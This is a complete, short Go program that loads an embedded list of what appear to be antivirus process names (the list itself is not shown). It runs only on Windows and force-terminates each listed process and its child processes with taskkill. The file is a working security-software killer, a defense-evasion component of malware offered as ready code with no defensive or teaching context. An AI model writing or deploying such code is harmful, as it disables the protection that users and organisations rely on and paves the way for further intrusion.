package main

import (
	_ "embed"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

//go:embed AvList.txt
var avList string

func main() {
	if runtime.GOOS != "windows" {
		fmt.Println("This application should run only under Windows")
		os.Exit(1)
	}
	for _, each := range strings.Split(avList, "\n") {
		TaskKill(each)
	}
}

func TaskKill(name string) {
	cmd := exec.Command("taskkill.exe", "/FI", name, "/F", "/T")
	if err := cmd.Run(); err != nil {
		fmt.Println("Error: ", err)
	}
}
